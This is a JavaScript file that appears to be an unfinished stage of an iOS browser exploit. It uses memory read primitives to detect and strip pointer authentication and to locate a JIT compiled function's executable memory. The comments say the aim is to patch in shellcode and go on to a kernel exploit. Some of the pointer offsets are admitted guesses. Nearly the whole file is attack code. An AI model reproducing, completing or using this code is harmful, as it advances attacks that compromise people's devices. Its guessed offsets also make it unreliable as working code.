function list(addr, times) {
    printf(`Listing [${addr}]`)
    for (var i = 0; i < times; i++) {
        printf(`[${i}: ${Add(addr, i * 8)}] ${primitives.read64(addr, i)}`);
    }
}

// Thanks to github.com/LinusHenze for the strat!
stages.push(() => {

    let hasPac = function () {
        let possibleSignedAddr = primitives.read64(
            primitives.read64(
                primitives.addrof(Math.min),
            3),    
        3);
        if (ShiftRight(possibleSignedAddr, 4) == 0x7fff) {
            return false; 
        } else if (ShiftRight(possibleSignedAddr, 5) == 0) {
            return false;
        }
        return true;
    }();

    if (hasPac) printf(`Device has pointer authentication (A12+)`);
    else printf(`Device does not have pointer authentication (<A12)`);

    function stripPac(addr) {
        if (hasPac) {
            return And(addr, new Int64('0xFFFFFFFF8'));
        } else {
            return addr;
        }
    }

    // So TLDR, RWX region of the app is unknown to me as offsets from the addrof
    // a jit compiled function have changed. If I could find it, I would be able
    // to implement the shellcode patching and start working on the kernel exploit.

    // Other tactics to circumvent this issue would be to overwrite an objects
    // vtable with a function pointer, but I don't know of any gadgets I could use
    // to sign a function pointer on devices with PAC.

    let shellcodeFunction = compileFunction();
    let shellcodeAddress = primitives.addrof(shellcodeFunction);
    printf(`Retreived shellcode function address [${shellcodeAddress}]`);
    let execAddress = stripPac(primitives.read64(shellcodeAddress, 3));
    printf(`Retreived shellcode execution address [${execAddress}]`);
    let jitPtr = stripPac(primitives.read64(execAddress, 1)); // Seems to be a pointer leading into RX JIT memory
    printf(`Retreived jit address [${jitPtr}]`);
    let rwxMemPtr = stripPac(primitives.read64(jitPtr, 4)); // This is 100 % a random guess, direct pointer to RX

    // primitives.copyTo(rwxMemPtr, primitives.copyFrom(rwxMemPtr, 16), 16); // This will crash confirming read-only

    list(rwxMemPtr, 10);
    printHexDump(primitives.copyFrom(rwxMemPtr, 8 * 10)); // Tell me if this looks right to you lol...
    
});